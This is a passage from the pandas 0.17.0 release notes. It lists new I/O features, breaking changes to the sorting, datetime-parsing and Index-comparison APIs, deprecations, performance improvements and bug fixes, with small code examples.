``ExcelWriter`` (:issue:`8188`)\n\n- SQL io functions now accept a SQLAlchemy connectable. (:issue:`7877`)\n\n- ``pd.read_sql`` and ``to_sql`` can accept database URI as ``con`` parameter (:issue:`10214`)\n\n- ``read_sql_table`` will now allow reading from views (:issue:`10750`).\n\n- Enable writing complex values to ``HDFStores`` when using the ``table`` format (:issue:`10447`)\n\n- Enable ``pd.read_hdf`` to be used without specifying a key when the HDF file contains a single dataset (:issue:`10443`)\n\n- ``pd.read_stata`` will now read Stata 118 type files. (:issue:`9882`)\n\n- ``msgpack`` submodule has been updated to 0.4.6 with backward compatibility (:issue:`10581`)\n\n- ``DataFrame.to_dict`` now accepts ``orient='index'`` keyword argument (:issue:`10844`).\n\n- ``DataFrame.apply`` will return a Series of dicts if the passed function returns a dict and ``reduce=True`` (:issue:`8735`).\n\n- Allow passing ``kwargs`` to the interpolation methods (:issue:`10378`).\n\n- Improved error message when concatenating an empty iterable of ``Dataframe`` objects (:issue:`9157`)\n\n- ``pd.read_csv`` can now read bz2-compressed files incrementally, and the C parser can read bz2-compressed files from AWS S3 (:issue:`11070`, :issue:`11072`).\n\n- In ``pd.read_csv``, recognize ``s3n://`` and ``s3a://`` URLs as designating S3 file storage (:issue:`11070`, :issue:`11071`).\n\n- Read CSV files from AWS S3 incrementally, instead of first downloading the entire file. (Full file download still required for compressed files in Python 2.)  (:issue:`11070`, :issue:`11073`)\n\n- ``pd.read_csv`` is now able to infer compression type for files read from AWS S3 storage (:issue:`11070`, :issue:`11074`).\n\n\n.. _whatsnew_0170.api:\n\n.. _whatsnew_0170.api_breaking:\n\nBackwards incompatible API changes\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n.. _whatsnew_0170.api_breaking.sorting:\n\nChanges to sorting API\n^^^^^^^^^^^^^^^^^^^^^^\n\nThe sorting API has had some longtime inconsistencies. (:issue:`9816`, :issue:`8239`).\n\nHere is a summary of the API **PRIOR** to 0.17.0:\n\n- ``Series.sort`` is **INPLACE** while ``DataFrame.sort`` returns a new object.\n- ``Series.order`` returns a new object\n- It was possible to use ``Series/DataFrame.sort_index`` to sort by **values** by passing the ``by`` keyword.\n- ``Series/DataFrame.sortlevel`` worked only on a ``MultiIndex`` for sorting by index.\n\nTo address these issues, we have revamped the API:\n\n- We have introduced a new method, :meth:`DataFrame.sort_values`, which is the merger of ``DataFrame.sort()``, ``Series.sort()``,\n  and ``Series.order()``, to handle sorting of **values**.\n- The existing methods ``Series.sort()``, ``Series.order()``, and ``DataFrame.sort()`` have been deprecated and will be removed in a\n  future version.\n- The ``by`` argument of ``DataFrame.sort_index()`` has been deprecated and will be removed in a future version.\n- The existing method ``.sort_index()`` will gain the ``level`` keyword to enable level sorting.\n\nWe now have two distinct and non-overlapping methods of sorting. A ``*`` marks items that\nwill show a ``FutureWarning``.\n\nTo sort by the **values**:\n\n==================================    ====================================\nPrevious                              Replacement\n==================================    ====================================\n\\* ``Series.order()``                 ``Series.sort_values()``\n\\* ``Series.sort()``                  ``Series.sort_values(inplace=True)``\n\\* ``DataFrame.sort(columns=...)``    ``DataFrame.sort_values(by=...)``\n==================================    ====================================\n\nTo sort by the **index**:\n\n==================================    ====================================\nPrevious                              Replacement\n==================================    ====================================\n``Series.sort_index()``               ``Series.sort_index()``\n``Series.sortlevel(level=...)``       ``Series.sort_index(level=...``)\n``DataFrame.sort_index()``            ``DataFrame.sort_index()``\n``DataFrame.sortlevel(level=...)``    ``DataFrame.sort_index(level=...)``\n\\* ``DataFrame.sort()``                 ``DataFrame.sort_index()``\n==================================    ====================================\n\nWe have also deprecated and changed similar methods in two Series-like classes, ``Index`` and ``Categorical``.\n\n==================================    ====================================\nPrevious                              Replacement\n==================================    ====================================\n\\* ``Index.order()``                  ``Index.sort_values()``\n\\* ``Categorical.order()``            ``Categorical.sort_values()``\n==================================    ====================================\n\n.. _whatsnew_0170.api_breaking.to_datetime:\n\nChanges to to_datetime and to_timedelta\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nError handling\n\"\"\"\"\"\"\"\"\"\"\"\"\"\"\n\nThe default for ``pd.to_datetime`` error handling has changed to ``errors='raise'``.\nIn prior versions it was ``errors='ignore'``. Furthermore, the ``coerce`` argument\nhas been deprecated in favor of ``errors='coerce'``. This means that invalid parsing\nwill raise rather that return the original input as in previous versions. (:issue:`10636`)\n\nPrevious behavior:\n\n.. code-block:: ipython\n\n   In [2]: pd.to_datetime(['2009-07-31', 'asd'])\n   Out[2]: array(['2009-07-31', 'asd'], dtype=object)\n\nNew behavior:\n\n.. code-block:: ipython\n\n   In [3]: pd.to_datetime(['2009-07-31', 'asd'])\n   ValueError: Unknown string format\n\nOf course you can coerce this as well.\n\n.. ipython:: python\n\n   pd.to_datetime([\"2009-07-31\", \"asd\"], errors=\"coerce\")\n\nTo keep the previous behavior, you can use ``errors='ignore'``:\n\n.. code-block:: ipython\n\n   In [4]: pd.to_datetime([\"2009-07-31\", \"asd\"], errors=\"ignore\")\n   Out[4]: Index(['2009-07-31', 'asd'], dtype='object')\n\nFurthermore, ``pd.to_timedelta`` has gained a similar API, of ``errors='raise'|'ignore'|'coerce'``, and the ``coerce`` keyword\nhas been deprecated in favor of ``errors='coerce'``.\n\nConsistent parsing\n\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\n\nThe string parsing of ``to_datetime``, ``Timestamp`` and ``DatetimeIndex`` has\nbeen made consistent. (:issue:`7599`)\n\nPrior to v0.17.0, ``Timestamp`` and ``to_datetime`` may parse year-only datetime-string incorrectly using today's date, otherwise ``DatetimeIndex``\nuses the beginning of the year. ``Timestamp`` and ``to_datetime`` may raise ``ValueError`` in some types of datetime-string which ``DatetimeIndex``\ncan parse, such as a quarterly string.\n\nPrevious behavior:\n\n.. code-block:: ipython\n\n   In [1]: pd.Timestamp('2012Q2')\n   Traceback\n      ...\n   ValueError: Unable to parse 2012Q2\n\n    Results in today's date.\n   In [2]: pd.Timestamp('2014')\n   Out [2]: 2014-08-12 00:00:00\n\nv0.17.0 can parse them as below. It works on ``DatetimeIndex`` also.\n\nNew behavior:\n\n.. ipython:: python\n\n   pd.Timestamp(\"2012Q2\")\n   pd.Timestamp(\"2014\")\n   pd.DatetimeIndex([\"2012Q2\", \"2014\"])\n\n.. note::\n\n   If you want to perform calculations based on today's date, use ``Timestamp.now()`` and ``pandas.tseries.offsets``.\n\n   .. ipython:: python\n\n      import pandas.tseries.offsets as offsets\n\n      pd.Timestamp.now()\n      pd.Timestamp.now() + offsets.DateOffset(years=1)\n\nChanges to Index comparisons\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nOperator equal on ``Index`` should behavior similarly to ``Series`` (:issue:`9947`, :issue:`10637`)\n\nStarting in v0.17.0, comparing ``Index`` objects of different lengths will raise\na ``ValueError``. This is to be consistent with the behavior of ``Series``.\n\nPrevious behavior:\n\n.. code-block:: ipython\n\n   In [2]: pd.Index([1, 2, 3]) == pd.Index([1, 4, 5])\n   Out[2]: array([ True, False, False], dtype=bool)\n\n   In [3]: pd.Index([1, 2, 3]) == pd.Index([2])\n   Out[3]: array([False,  True, False], dtype=bool)\n\n   In [4]: pd.Index([1, 2, 3]) == pd.Index([1, 2])\n   Out[4]: False\n\nNew behavior:\n\n.. code-block:: ipython\n\n   In [8]: pd.Index([1, 2, 3]) == pd.Index([1, 4, 5])\n   Out[8]: array([ True, False, False], dtype=bool)\n\n   In [9]: pd.Index([1, 2, 3]) == pd.Index([2])\n   ValueError: Lengths must match to compare\n\n   In [10]: pd.Index([1, 2, 3]) == pd.Index([1, 2])\n   ValueError: Lengths must match to compare\n\nNote that this is different from the ``numpy`` behavior where a comparison can\nbe broadcast:\n\n.. ipython:: python\n\n   np.array([1, 2, 3]) == np.array([1])\n\nor it can return False if broadcasting can not be done:\n\n.. code-block:: ipython\n\n   In [11]: np.array([1, 2, 3]) == np.array([1, 2])\n   Out[11]: False\n\nChanges to boolean comparisons vs. None\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nBoolean comparisons of a ``Series`` vs ``None`` will now be equivalent to comparing with ``np.nan``, rather than raise ``TypeError``. (:issue:`1079`).\n\n.. ipython:: python\n\n   s = pd.Series(range(3), dtype=\"float\")\n   s.iloc[1] = None\n   s\n\nPrevious behavior:\n\n.. code-block:: ipython\n\n   In [5]: s == None\n   TypeError: Could not compare <type 'NoneType'> type with Series\n\nNew behavior:\n\n.. ipython:: python\n\n   s == None\n\nUsually you simply want to know which values are null.\n\n.. ipython:: python\n\n   s.isnull()\n\n.. warning::\n\n   You generally will want to use ``isnull/notnull`` for these types of comparisons, as ``isnull/notnull`` tells you which elements are null. One has to be\n   mindful that ``nan's`` don't compare equal, but ``None's`` do. Note that pandas/numpy uses the fact that ``np.nan != np.nan``, and treats ``None`` like ``np.nan``.\n\n   .. ipython:: python\n\n      None == None\n      np.nan == np.nan\n\n.. _whatsnew_0170.api_breaking.hdf_dropna:\n\nHDFStore dropna behavior\n^^^^^^^^^^^^^^^^^^^^^^^^\n\nThe default behavior for HDFStore write functions with ``format='table'`` is now to keep rows that are all missing. Previously, the behavior was to drop rows that were all missing save the index. The previous behavior can be replicated using the ``dropna=True`` option. (:issue:`9382`)\n\nPrevious behavior:\n\n.. ipython:: python\n\n   df_with_missing = pd.DataFrame(\n       {\"col1\": [0, np.nan, 2], \"col2\": [1, np.nan, np.nan]}\n   )\n\n   df_with_missing\n\n\n.. code-block:: ipython\n\n   In [27]:\n   df_with_missing.to_hdf('file.h5',\n                          key='df_with_missing',\n                          format='table',\n                          mode='w')\n\n   In [28]: pd.read_hdf('file.h5', 'df_with_missing')\n\n   Out [28]:\n         col1  col2\n     0     0     1\n     2     2   NaN\n\n\nNew behavior:\n\n.. ipython:: python\n\n   df_with_missing.to_hdf(\"file.h5\", key=\"df_with_missing\", format=\"table\", mode=\"w\")\n\n   pd.read_hdf(\"file.h5\", \"df_with_missing\")\n\n.. ipython:: python\n   :suppress:\n\n   import os\n\n   os.remove(\"file.h5\")\n\nSee the :ref:`docs <io.hdf5>` for more details.\n\n.. _whatsnew_0170.api_breaking.display_precision:\n\nChanges to ``display.precision`` option\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nThe ``display.precision`` option has been clarified to refer to decimal places (:issue:`10451`).\n\nEarlier versions of pandas would format floating point numbers to have one less decimal place than the value in\n``display.precision``.\n\n.. code-block:: ipython\n\n  In [1]: pd.set_option('display.precision', 2)\n\n  In [2]: pd.DataFrame({'x': [123.456789]})\n  Out[2]:\n         x\n  0  123.5\n\nIf interpreting precision as \"significant figures\" this did work for scientific notation but that same interpretation\ndid not work for values with standard formatting. It was also out of step with how numpy handles formatting.\n\nGoing forward the value of ``display.precision`` will directly control the number of places after the decimal, for\nregular formatting as well as scientific notation, similar to how numpy's ``precision`` print option works.\n\n.. ipython:: python\n\n  pd.set_option(\"display.precision\", 2)\n  pd.DataFrame({\"x\": [123.456789]})\n\nTo preserve output behavior with prior versions the default value of ``display.precision`` has been reduced to ``6``\nfrom ``7``.\n\n.. ipython:: python\n  :suppress:\n\n  pd.set_option(\"display.precision\", 6)\n\n.. _whatsnew_0170.api_breaking.categorical_unique:\n\nChanges to ``Categorical.unique``\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n``Categorical.unique`` now returns new ``Categoricals`` with ``categories`` and ``codes`` that are unique, rather than returning ``np.array`` (:issue:`10508`)\n\n- unordered category: values and categories are sorted by appearance order.\n- ordered category: values are sorted by appearance order, categories keep existing order.\n\n.. ipython:: python\n\n   cat = pd.Categorical([\"C\", \"A\", \"B\", \"C\"], categories=[\"A\", \"B\", \"C\"], ordered=True)\n   cat\n   cat.unique()\n\n   cat = pd.Categorical([\"C\", \"A\", \"B\", \"C\"], categories=[\"A\", \"B\", \"C\"])\n   cat\n   cat.unique()\n\nChanges to ``bool`` passed as ``header`` in parsers\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nIn earlier versions of pandas, if a bool was passed the ``header`` argument of\n``read_csv``, ``read_excel``, or ``read_html`` it was implicitly converted to\nan integer, resulting in ``header=0`` for ``False`` and ``header=1`` for ``True``\n(:issue:`6113`)\n\nA ``bool`` input to ``header`` will now raise a ``TypeError``\n\n.. code-block:: ipython\n\n   In [29]: df = pd.read_csv('data.csv', header=False)\n   TypeError: Passing a bool to header is invalid. Use header=None for no header or\n   header=int or list-like of ints to specify the row(s) making up the column names\n\n\n.. _whatsnew_0170.api_breaking.other:\n\nOther API changes\n^^^^^^^^^^^^^^^^^\n\n- Line and kde plot with ``subplots=True`` now uses default colors, not all black. Specify ``color='k'`` to draw all lines in black (:issue:`9894`)\n- Calling the ``.value_counts()`` method on a Series with a ``categorical`` dtype now returns a Series with a ``CategoricalIndex`` (:issue:`10704`)\n- The metadata properties of subclasses of pandas objects will now be serialized (:issue:`10553`).\n- ``groupby`` using ``Categorical`` follows the same rule as ``Categorical.unique`` described above  (:issue:`10508`)\n- When constructing ``DataFrame`` with an array of ``complex64`` dtype previously meant the corresponding column\n  was automatically promoted to the ``complex128`` dtype. pandas will now preserve the itemsize of the input for complex data (:issue:`10952`)\n- some numeric reduction operators would return ``ValueError``, rather than ``TypeError`` on object types that includes strings and numbers (:issue:`11131`)\n- Passing currently unsupported ``chunksize`` argument to ``read_excel`` or ``ExcelFile.parse`` will now raise ``NotImplementedError`` (:issue:`8011`)\n- Allow an ``ExcelFile`` object to be passed into ``read_excel`` (:issue:`11198`)\n- ``DatetimeIndex.union`` does not infer ``freq`` if ``self`` and the input have ``None`` as ``freq`` (:issue:`11086`)\n- ``NaT``'s methods now either raise ``ValueError``, or return ``np.nan`` or ``NaT`` (:issue:`9513`)\n\n  ===============================     ===============================================================\n  Behavior                            Methods\n  ===============================     ===============================================================\n  return ``np.nan``                   ``weekday``, ``isoweekday``\n  return ``NaT``                      ``date``, ``now``, ``replace``, ``to_datetime``, ``today``\n  return ``np.datetime64('NaT')``     ``to_datetime64`` (unchanged)\n  raise ``ValueError``                All other public methods (names not beginning with underscores)\n  ===============================     ===============================================================\n\n.. _whatsnew_0170.deprecations:\n\nDeprecations\n^^^^^^^^^^^^\n\n- For ``Series`` the following indexing functions are deprecated (:issue:`10177`).\n\n  =====================  =================================\n  Deprecated Function    Replacement\n  =====================  =================================\n  ``.irow(i)``           ``.iloc[i]`` or ``.iat[i]``\n  ``.iget(i)``           ``.iloc[i]`` or ``.iat[i]``\n  ``.iget_value(i)``     ``.iloc[i]`` or ``.iat[i]``\n  =====================  =================================\n\n- For ``DataFrame`` the following indexing functions are deprecated (:issue:`10177`).\n\n  =====================  =================================\n  Deprecated Function    Replacement\n  =====================  =================================\n  ``.irow(i)``           ``.iloc[i]``\n  ``.iget_value(i, j)``  ``.iloc[i, j]`` or ``.iat[i, j]``\n  ``.icol(j)``           ``.iloc[:, j]``\n  =====================  =================================\n\n.. note:: These indexing function have been deprecated in the documentation since 0.11.0.\n\n- ``Categorical.name`` was deprecated to make ``Categorical`` more ``numpy.ndarray`` like. Use ``Series(cat, name=\"whatever\")`` instead (:issue:`10482`).\n- Setting missing values (NaN) in a ``Categorical``'s ``categories`` will issue a warning (:issue:`10748`). You can still have missing values in the ``values``.\n- ``drop_duplicates`` and ``duplicated``'s ``take_last`` keyword was deprecated in favor of ``keep``. (:issue:`6511`, :issue:`8505`)\n- ``Series.nsmallest`` and ``nlargest``'s ``take_last`` keyword was deprecated in favor of ``keep``. (:issue:`10792`)\n- ``DataFrame.combineAdd`` and ``DataFrame.combineMult`` are deprecated. They\n  can easily be replaced by using the ``add`` and ``mul`` methods:\n  ``DataFrame.add(other, fill_value=0)`` and ``DataFrame.mul(other, fill_value=1.)``\n  (:issue:`10735`).\n- ``TimeSeries`` deprecated in favor of ``Series`` (note that this has been an alias since 0.13.0), (:issue:`10890`)\n- ``SparsePanel`` deprecated and will be removed in a future version (:issue:`11157`).\n- ``Series.is_time_series`` deprecated in favor of ``Series.index.is_all_dates`` (:issue:`11135`)\n- Legacy offsets (like ``'AJAN'``) are deprecated (note that this has been alias since 0.8.0) (:issue:`10878`)\n- ``WidePanel`` deprecated in favor of ``Panel``, ``LongPanel`` in favor of ``DataFrame`` (note these have been aliases since < 0.11.0), (:issue:`10892`)\n- ``DataFrame.convert_objects`` has been deprecated in favor of type-specific functions ``pd.to_datetime``, ``pd.to_timestamp`` and ``pd.to_numeric`` (new in 0.17.0) (:issue:`11133`).\n\n.. _whatsnew_0170.prior_deprecations:\n\nRemoval of prior version deprecations/changes\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n- Removal of ``na_last`` parameters from ``Series.order()`` and ``Series.sort()``, in favor of ``na_position``. (:issue:`5231`)\n- Remove of ``percentile_width`` from ``.describe()``, in favor of ``percentiles``. (:issue:`7088`)\n- Removal of ``colSpace`` parameter from ``DataFrame.to_string()``, in favor of ``col_space``, circa 0.8.0 version.\n- Removal of automatic time-series broadcasting (:issue:`2304`)\n\n  .. ipython:: python\n\n     np.random.seed(1234)\n     df = pd.DataFrame(\n         np.random.randn(5, 2),\n         columns=list(\"AB\"),\n         index=pd.date_range(\"2013-01-01\", periods=5),\n     )\n     df\n\n  Previously\n\n  .. code-block:: ipython\n\n     In [3]: df + df.A\n     FutureWarning: TimeSeries broadcasting along DataFrame index by default is deprecated.\n     Please use DataFrame.<op> to explicitly broadcast arithmetic operations along the index\n\n     Out[3]:\n                         A         B\n     2013-01-01  0.942870 -0.719541\n     2013-01-02  2.865414  1.120055\n     2013-01-03 -1.441177  0.166574\n     2013-01-04  1.719177  0.223065\n     2013-01-05  0.031393 -2.226989\n\n  Current\n\n  .. ipython:: python\n\n     df.add(df.A, axis=\"index\")\n\n\n- Remove ``table`` keyword in ``HDFStore.put/append``, in favor of using ``format=`` (:issue:`4645`)\n- Remove ``kind`` in ``read_excel/ExcelFile`` as its unused (:issue:`4712`)\n- Remove ``infer_type`` keyword from ``pd.read_html`` as its unused (:issue:`4770`, :issue:`7032`)\n- Remove ``offset`` and ``timeRule`` keywords from ``Series.tshift/shift``, in favor of ``freq`` (:issue:`4853`, :issue:`4864`)\n- Remove ``pd.load/pd.save`` aliases in favor of ``pd.to_pickle/pd.read_pickle`` (:issue:`3787`)\n\n.. _whatsnew_0170.performance:\n\nPerformance improvements\n~~~~~~~~~~~~~~~~~~~~~~~~\n\n- Development support for benchmarking with the `Air Speed Velocity library <https://github.com/spacetelescope/asv/>`_ (:issue:`8361`)\n- Added vbench benchmarks for alternative ExcelWriter engines and reading Excel files (:issue:`7171`)\n- Performance improvements in ``Categorical.value_counts`` (:issue:`10804`)\n- Performance improvements in ``SeriesGroupBy.nunique`` and ``SeriesGroupBy.value_counts`` and ``SeriesGroupby.transform`` (:issue:`10820`, :issue:`11077`)\n- Performance improvements in ``DataFrame.drop_duplicates`` with integer dtypes (:issue:`10917`)\n- Performance improvements in ``DataFrame.duplicated`` with wide frames. (:issue:`10161`, :issue:`11180`)\n- 4x improvement in ``timedelta`` string parsing (:issue:`6755`, :issue:`10426`)\n- 8x improvement in ``timedelta64`` and ``datetime64`` ops (:issue:`6755`)\n- Significantly improved performance of indexing ``MultiIndex`` with slicers (:issue:`10287`)\n- 8x improvement in ``iloc`` using list-like input (:issue:`10791`)\n- Improved performance of ``Series.isin`` for datetimelike/integer Series (:issue:`10287`)\n- 20x improvement in ``concat`` of Categoricals when categories are identical (:issue:`10587`)\n- Improved performance of ``to_datetime`` when specified format string is ISO8601 (:issue:`10178`)\n- 2x improvement of ``Series.value_counts`` for float dtype (:issue:`10821`)\n- Enable ``infer_datetime_format`` in ``to_datetime`` when date components do not have 0 padding (:issue:`11142`)\n- Regression from 0.16.1 in constructing ``DataFrame`` from nested dictionary (:issue:`11084`)\n- Performance improvements in addition/subtraction operations for ``DateOffset`` with ``Series`` or ``DatetimeIndex``  (:issue:`10744`, :issue:`11205`)\n\n.. _whatsnew_0170.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n\n- Bug in incorrect computation of ``.mean()`` on ``timedelta64[ns]`` because of overflow (:issue:`9442`)\n- Bug in  ``.isin`` on older numpies (:issue:`11232`)\n- Bug in ``DataFrame.to_html(index=False)`` renders unnecessary ``name`` row (:issue:`10344`)\n- Bug in ``DataFrame.to_latex()`` the ``column_format`` argument could not be passed (:issue:`9402`)\n- Bug in ``DatetimeIndex`` when localizing with ``NaT`` (:issue:`10477`)\n- Bug in ``Series.dt`` ops in preserving meta-data (:issue:`10477`)\n- Bug in preserving ``NaT`` when passed in an otherwise invalid ``to_datetime`` construction (:issue:`10477`)\n- Bug in ``DataFrame.apply`` when function returns categorical series. (:issue:`9573`)\n- Bug in ``to_datetime`` with invalid dates and formats supplied (:issue:`10154`)\n- Bug in ``Index.drop_duplicates`` dropping name(s) (:issue:`10115`)\n- Bug in ``Series.quantile`` dropping name (:issue:`10881`)\n- Bug in ``pd.Series`` when setting a value on an empty ``Series`` whose index has a frequency. (:issue:`10193`)\n- Bug in ``pd.Series.interpolate`` with invalid ``order`` keyword values. (:issue:`10633`)\n- Bug in ``DataFrame.plot`` raises ``ValueError`` when color name is specified by multiple characters (:issue:`10387`)\n- Bug in ``Index`` construction with a mixed list of tuples (:issue:`10697`)\n- Bug in ``DataFrame.reset_index`` when index contains ``NaT``. (:issue:`10388`)\n- Bug in ``ExcelReader`` when worksheet is empty (:issue:`6403`)\n- Bug in ``BinGrouper.group_info`` where returned values are not compatible with base class (:issue:`10914`)\n- Bug in clearing the cache on ``DataFrame.pop`` and a subsequent inplace op (:issue:`10912`)\n- Bug in indexing with a mixed-integer ``Index`` causing an ``ImportError`` (:issue:`10610`)\n- Bug in ``Series.count`` when index has nulls (:issue:`10946`)\n- Bug in pickling of a non-regular freq ``DatetimeIndex`` (:issue:`11002`)\n- Bug causing ``DataFrame.where`` to not respect the ``axis`` parameter when the frame has a symmetric shape. (:issue:`9736`)\n- Bug in ``Table.select_column`` where name is not preserved (:issue:`10392`)\n- Bug in ``offsets.generate_range`` where ``start`` and ``end`` have finer precision than ``offset`` (:issue:`9907`)\n- Bug in ``pd.rolling_*`` where ``Series.name`` would be lost in the output (:issue:`10565`)\n- Bug in ``stack`` when index or columns are not unique. (:issue:`10417`)\n- Bug in setting a ``Panel`` when an axis has a MultiIndex (:issue:`10360`)\n- Bug in ``USFederalHolidayCalendar`` where ``USMemorialDay`` and ``USMartinLutherKingJr`` were incorrect (:issue:`10278` and :issue:`9760` )\n- Bug in ``.sample()`` where returned object, if set, gives unnecessary ``SettingWithCopyWarning`` (:issue:`10738`)\n- Bug in ``.sample()`` where weights passed as ``Series`` were not aligned along axis before being treated positionally, potentially causing problems if weight indices were not aligned with sampled object. (:issue:`10738`)\n\n- Regression fixed in (:issue:`9311`, :issue:`6620`, :issue:`9345`), where groupby with a datetime-like converting to float with certain aggregators (:issue:`10979`)\n\n- Bug in ``DataFrame.interpolate`` with ``axis=1`` and ``inplace=True`` (:issue:`10395`)\n- Bug in ``io.sql.get_schema`` when specifying multiple columns as primary\n  key (:issue:`10385`).\n\n- Bug in ``groupby(sort=False)`` with datetime-like ``Categorical`` raises ``ValueError`` (:issue:`10505`)\n- Bug in ``groupby(axis=1)`` with ``filter()`` throws ``IndexError`` (:issue:`11041`)\n- Bug in ``test_categorical`` on big-endian builds (:issue:`10425`)\n- Bug in ``Series.shift`` and ``DataFrame.shift`` not supporting categorical data (:issue:`9416`)\n- Bug in ``Series.map`` using categorical ``Series`` raises ``AttributeError`` (:issue:`10324`)\n- Bug in ``MultiIndex.get_level_values`` including ``Categorical`` raises ``AttributeError`` (:issue:`10460`)\n- Bug in ``pd.get_dummies`` with ``sparse=True`` not returning ``SparseDataFrame`` (:issue:`10531`)\n- Bug in ``Index`` subtypes (such as ``PeriodIndex``) not returning their own type for ``.drop`` and ``.insert`` methods (:issue:`10620`)\n- Bug in ``algos.outer_join_indexer`` when ``right`` array is empty (:issue:`10618`)\n\n- Bug in ``filter`` (regression from 0.16.0) and ``transform`` when grouping on multiple keys, one of which is datetime-like (:issue:`10114`)\n\n\n- Bug in ``to_datetime`` and ``to_timedelta`` causing ``Index`` name to be lost (:issue:`10875`)\n- Bug in ``len(DataFrame.groupby)`` causing ``IndexError`` when there's a column containing only NaNs (:issue:`11016`)\n\n- Bug that caused segfault when resampling an empty Series (:issue:`10228`)\n- Bug in ``DatetimeIndex`` and ``PeriodIndex.value_counts`` resets name from its result, but retains in result's ``Index``. (:issue:`10150`)\n- Bug in ``pd.eval`` using ``numexpr`` engine coerces 1 element numpy array to scalar (:issue:`10546`)\n- Bug in ``pd.concat`` with ``axis=0`` when column is of dtype ``category`` (:issue:`10177`)\n- Bug in ``read_msgpack`` where input type is not always checked (:issue:`10369`, :issue:`10630`)\n- Bug in ``pd.read_csv`` with kwargs ``index_col=False``, ``index_col=['a', 'b']`` or ``dtype``\n  (:issue:`10413`, :issue:`10467`, :issue:`10577`)\n- Bug in ``Series.from_csv`` with ``header`` kwarg not setting the ``Series.name`` or the ``Series.index.name`` (:issue:`10483`)\n- Bug in ``groupby.var`` which caused variance to be inaccurate for small float values (:issue:`10448`)\n- Bug in ``Series.plot(kind='hist')`` Y Label not informative (:issue:`10485`)\n- Bug in ``read_csv`` when using a converter which generates a ``uint8`` type (:issue:`9266`)\n\n- Bug causes memory leak in time-series line and area plot (:issue:`9003`)\n\n- Bug when setting a ``Panel`` sliced along the major or minor axes when the right-hand side is a ``DataFrame`` (:issue:`11014`)\n- Bug that returns ``None`` and does not raise ``NotImplementedError`` when operator functions (e.g. ``.add``) of ``Panel`` are not implemented (:issue:`7692`)\n\n- Bug in line and kde plot cannot accept multiple colors when ``subplots=True`` (:issue:`9894`)\n- Bug in ``DataFrame.plot`` raises ``ValueError`` when color name is specified by multiple characters (:issue:`10387`)\n\n- Bug in left and right ``align`` of ``Series`` with ``MultiIndex`` may be inverted (:issue:`10665`)\n- Bug in left and right ``join`` of with ``MultiIndex`` may be inverted (:issue:`10741`)\n\n- Bug in ``read_stata`` when reading a file with a different order set in ``columns`` (:issue:`10757`)\n- Bug in ``Categorical`` may not representing properly when category contains ``tz`` or ``Period`` (:issue:`10713`)\n- Bug in ``Categorical.__iter__`` may not returning correct ``datetime`` and ``Period`` (:issue:`10713`)\n- Bug in indexing with a ``PeriodIndex`` on an object with a ``PeriodIndex`` (:issue:`4125`)\n- Bug in ``read_csv`` with ``engine='c'``: EOF preceded by a comment, blank line, etc. was not handled correctly (:issue:`10728`, :issue:`10548`)\n\n- Reading \"famafrench\" data via ``DataReader`` results in HTTP 404 error because of the website url is changed (:issue:`10591`).\n- Bug in ``read_msgpack`` where DataFrame to decode has duplicate column names (:issue:`9618`)\n- Bug in ``io.common.get_filepath_or_buffer`` which caused reading of valid S3 files to fail if the bucket also contained keys for which the user does not have read permission (:issue:`10604`)\n- Bug in vectorised setting of timestamp columns with python ``datetime.date`` and numpy ``datetime64`` (:issue:`10408`, :issue:`10412`)\n- Bug in ``Index.take`` may add unnecessary ``freq`` attribute (:issue:`10791`)\n- Bug in ``merge`` with empty ``DataFrame`` may raise ``IndexError`` (:issue:`10824`)\n- Bug in ``to_latex`` where unexpected keyword argument for some documented arguments (:issue:`10888`)\n- Bug in indexing of large ``DataFrame`` where ``IndexError`` is uncaught (:issue:`10645` and :issue:`10692`)\n- Bug in ``read_csv`` when using the ``nrows`` or ``chunksize`` parameters if file contains only a header line (:issue:`9535`)\n- Bug in serialization of ``category`` types in HDF5 in presence of alternate encodings. (:issue:`10366`)\n- Bug in ``pd.DataFrame`` when constructing an empty DataFrame with a string dtype (:issue:`9428`)\n- Bug in ``pd.DataFrame.diff`` when DataFrame is not consolidated (:issue:`10907`)\n- Bug in ``pd.unique`` for arrays with the ``datetime64`` or ``timedelta64`` dtype that meant an array with object dtype was returned instead the original dtype (:issue:`9431`)\n- Bug in ``Timedelta`` raising error when slicing from 0s (:issue:`10583`)\n- Bug in ``DatetimeIndex.take`` and ``TimedeltaIndex.take`` may not raise ``IndexError`` against invalid index (:issue:`10295`)\n- Bug in ``Series([np.nan]).astype('M8[ms]')``, which now returns ``Series([pd.NaT])`` (:issue:`10747`)\n- Bug in ``PeriodIndex.order`` reset freq (:issue:`10295`)\n- Bug in ``date_range`` when ``freq`` divides ``end`` as nanos (:issue:`10885`)\n- Bug in ``iloc`` allowing memory outside bounds of a Series to be accessed with negative integers (:issue:`10779`)\n- Bug in ``read_msgpack`` where encoding is not respected (:issue:`10581`)\n- Bug preventing access to the first index when using ``iloc`` with a list containing the appropriate negative integer (:issue:`10547`, :issue:`10779`)\n- Bug in ``TimedeltaIndex`` formatter causing error while trying to save ``DataFrame`` with ``TimedeltaIndex`` using ``to_csv`` (:issue:`10833`)\n- Bug in ``DataFrame.where`` when handling Series slicing (:issue:`10218`, :issue:`9558`)\n- Bug where ``pd.read_gbq`` throws ``ValueError`` when Bigquery returns zero rows (:issue:`10273`)\n- Bug in ``to_json`` which was causing segmentation fault when serializing 0-rank ndarray (:issue:`9576`)\n- Bug in plotting functions may raise ``IndexError`` when plotted on ``GridSpec`` (:issue:`10819`)\n- Bug in plot result may show unnecessary minor ticklabels (:issue:`10657`)\n- Bug in ``groupby`` incorrect computation for aggregation on ``DataFrame`` with ``NaT`` (E.g ``first``, ``last``, ``min``). (:issue:`10590`, :issue:`11010`)\n- Bug when constructing ``DataFrame`` where passing a dictionary with only scalar values and specifying columns did not raise an error (:issue:`10856`)\n- Bug in ``.var()`` causing roundoff errors for highly similar values (:issue:`10242`)\n- Bug in ``DataFrame.plot(subplots=True)`` with duplicated columns outputs incorrect 